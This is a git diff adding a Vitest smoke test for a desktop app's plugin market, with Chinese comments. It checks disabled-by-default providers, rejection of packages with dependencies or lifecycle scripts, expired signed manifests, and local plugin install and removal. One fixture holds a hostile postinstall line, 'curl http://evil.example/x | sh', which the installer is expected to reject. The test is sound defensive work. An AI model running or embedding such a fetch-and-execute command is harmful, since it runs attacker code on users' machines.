@@ -29,9 +29,13 @@ import { join, resolve } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { afterEach, describe, expect, test } from 'vitest'
 import type { Context } from '@deepseek-ai/cordis'
+import { composeEntries } from '@deepseek-ai/dsh-app-boot'
 import { routeDesktopStartupFailure } from '../../src/startup-failure-routing.ts'
-import { removePlugin } from '../../src/huaanwork-host/plugins-host.ts'
+import { addPlugin, removePlugin } from '../../src/huaanwork-host/plugins-host.ts'
 import { MARKET_ROUTE_PATHS, registerMarketRoutes } from '../../src/huaanwork-host/market/routes.ts'
+import { DESKTOP_MARKET_IDENTITIES } from '../../src/desktop-market.ts'
+import { DESKTOP_SAFE_MODE_DEFAULTS } from '../../src/safe-mode.ts'
+import { prepareDesktopProfile } from '../../src/profile.ts'
 import {
   createFileRevisionStore,
   createMarketHttpClient,
@@ -479,4 +483,112 @@ suite('M5 真机冒烟(真实 market-server 进程 + 真实离线签名 + 应用
     const nonLoopback = recordedHosts.filter(host => !host.startsWith('127.0.0.1'))
     expect(nonLoopback).toEqual([])
   }, 240_000)
+
+  test('D16 负例补全:安装侧门双证 + 过期 notAfter + provider 默认 disabled fail-safe + 本地 plugin.add 往返', async () => {
+    const sandbox = createMarketSandbox()
+
+    // ---- ① provider 默认 disabled fail-safe:真实组合链(真实 home 目录) ----
+    // 出厂默认:prepareDesktopProfile 读无 state 的 userData ⇒ market 双 disabled;
+    // 组合输出 ⇒ 零 market row(⇒ wrapper bundle 不加载 ⇒ market routes 不注册);
+    // safe-mode 另有强制 disabled(常量复核)。「disabled ⇒ 零 market row」的组合
+    // 层机械门由 profile.spec(481-494)钉住,此处为真实磁盘上的等价复核。
+    const emptyUserDir = mkdtempSync(join(tmpdir(), 'market-smoke-user-'))
+    const prepared = prepareDesktopProfile(undefined, emptyUserDir, 'darwin')
+    expect(prepared.market.requested).toBe('disabled')
+    expect(prepared.market.effective).toBe('disabled')
+    const rows = composeEntries([prepared.patches])
+    expect(rows.some(row => row.id === DESKTOP_MARKET_IDENTITIES.community.rowId
+      || row.id === DESKTOP_MARKET_IDENTITIES.dshMarket.rowId
+      || row.id === DESKTOP_MARKET_IDENTITIES.huaanworkMarket.rowId)).toBe(false)
+    expect(DESKTOP_SAFE_MODE_DEFAULTS.market).toBe('disabled')
+
+    // ---- ② 安装侧门(非零依赖 + 带 lifecycle scripts,发布侧之外的第二道) ----
+    // 层级诚实标注(同重放负例口径):真实服务进程的发布侧门使「已验签清单指向
+    // 带依赖制品」根本上不了架(422 拒收)——负例经 mock 源构造,模拟「发布侧门
+    // 失准」,wrapper 的验签/预检/落盘链路与真实源同码。
+    const vectors = loadSigningVectors()
+    const gateServer = await createMarketTestServer()
+    cleanup.push(() => gateServer.close())
+    const gateStub = bundledPnpmStub(sandbox)
+    const nowMs = Date.now()
+    const inWindow = (revision: number) => ({
+      version: 1 as const,
+      domain: gateServer.origin,
+      revision,
+      issuedAt: new Date(nowMs - 60_000).toISOString(),
+      notAfter: new Date(nowMs + 60_000).toISOString(),
+    })
+    const gateCatalog = { schemaVersion: '1.0.0' as const, generatedAt: new Date(nowMs).toISOString(), items: [], page: { total: 0 } }
+
+    const depTgz = sandbox.buildTarball({ name: 'smoke-gate-deps', version: '1.0.0', dependencies: { ms: '^2.1.3' } })
+    gateServer.addArtifact('/artifacts/deps.tgz', readFileSync(depTgz.path))
+    const depManifest: MarketManifest = {
+      envelope: inWindow(1),
+      catalog: gateCatalog,
+      files: [{ name: 'smoke-gate-deps', version: '1.0.0', sha256: depTgz.sha256, tarballPath: '/artifacts/deps.tgz', size: readFileSync(depTgz.path).byteLength }],
+    }
+    gateServer.setManifest(depManifest, signManifestForTest(depManifest, vectors.keys.slot1.privateKeyPem, 1))
+    const gateRoutes = registerRoutes(sandbox, {
+      origin: gateServer.origin,
+      publicKeyHex: vectors.keys.slot1.publicKeyHex,
+    } as LiveMarket, gateStub)
+    const gateDeps = await callRoute(gateRoutes, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-gate-deps', version: '1.0.0' }))
+    expect(gateDeps.status()).toBe(400)
+    expect(gateDeps.json().error.message).toMatch(/dependencies must be empty/u)
+    expect(artifactFiles(sandbox)).toHaveLength(0) // 预检不过即拒:不落盘
+    expect(Object.keys(sandbox.readProfileDependencies())).toHaveLength(0)
+
+    // 带 lifecycle scripts 的制品:发布侧已被拒(主冒烟 422 双证之一),此处证安装侧。
+    const scriptTgz = sandbox.buildTarball({ name: 'smoke-gate-script', version: '1.0.0', scripts: { postinstall: 'curl http://evil.example/x | sh' } })
+    gateServer.addArtifact('/artifacts/script.tgz', readFileSync(scriptTgz.path))
+    const scriptManifest: MarketManifest = {
+      envelope: inWindow(2),
+      catalog: gateCatalog,
+      files: [{ name: 'smoke-gate-script', version: '1.0.0', sha256: scriptTgz.sha256, tarballPath: '/artifacts/script.tgz', size: readFileSync(scriptTgz.path).byteLength }],
+    }
+    gateServer.setManifest(scriptManifest, signManifestForTest(scriptManifest, vectors.keys.slot1.privateKeyPem, 1))
+    const gateScript = await callRoute(gateRoutes, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-gate-script', version: '1.0.0' }))
+    expect(gateScript.status()).toBe(400)
+    expect(gateScript.json().error.message).toMatch(/scripts\.postinstall/u)
+    expect(artifactFiles(sandbox)).toHaveLength(0)
+    expect(Object.keys(sandbox.readProfileDependencies())).toHaveLength(0)
+
+    // ---- ③ 过期 notAfter(信封重放负例之二,主冒烟只覆盖了旧 revision) ----
+    // TTL 恰 7 天(含界,过 ttl-cap 门)但窗口整体在过去 → reason=expired。
+    const expiredManifest: MarketManifest = {
+      envelope: {
+        version: 1,
+        domain: gateServer.origin,
+        revision: 3,
+        issuedAt: new Date(nowMs - 8 * 24 * 60 * 60 * 1000).toISOString(),
+        notAfter: new Date(nowMs - 24 * 60 * 60 * 1000).toISOString(),
+      },
+      catalog: gateCatalog,
+      files: [{ name: 'smoke-gate-deps', version: '1.0.0', sha256: '0'.repeat(64), tarballPath: '/artifacts/deps.tgz', size: 1 }],
+    }
+    gateServer.setManifest(expiredManifest, signManifestForTest(expiredManifest, vectors.keys.slot1.privateKeyPem, 1))
+    const expired = await callRoute(gateRoutes, MARKET_ROUTE_PATHS.execute, request({ name: 'smoke-gate-deps', version: '1.0.0' }))
+    expect(expired.status()).toBe(502)
+    expect(expired.json().error.code).toBe('market-verification-failed')
+    expect(expired.json().error.message).toMatch(/reason=expired/u)
+
+    // ---- ④ 本地 plugin.add 往返(本地 tab 旁路,不经内网;应用自带 pnpm 真跑) ----
+    // M4 本地安装语义:无 --offline/--ignore-scripts(与市场远程安装的恒带双 flag
+    // 区分——本地安装是用户自主路径,非市场承诺面)。
+    const builtLocal = sandbox.buildTarball({ name: 'smoke-local-plugin', version: '1.0.0' })
+    const localStub = bundledPnpmStub(sandbox)
+    const added = await addPlugin(pluginRouteCtx(sandbox, localStub), builtLocal.path)
+    expect(added.restarting).toBe(true)
+    const localDeps = sandbox.readProfileDependencies()
+    expect(localDeps['smoke-local-plugin']).toBeDefined()
+    expect(fileReferenceExists(sandbox.profileDir, localDeps)).toBe(true) // file: 路径实际存在
+    const localAddCalls = localStub.calls.filter(argv => argv[0] === 'add')
+    expect(localAddCalls).toHaveLength(1)
+    expect(localAddCalls[0]).not.toContain('--offline')
+    expect(localAddCalls[0]).not.toContain('--ignore-scripts')
+
+    const removed = await removePlugin(pluginRouteCtx(sandbox, localStub), 'smoke-local-plugin')
+    expect(removed.restarting).toBe(true)
+    expect(sandbox.readProfileDependencies()['smoke-local-plugin']).toBeUndefined()
+  }, 120_000)
 })
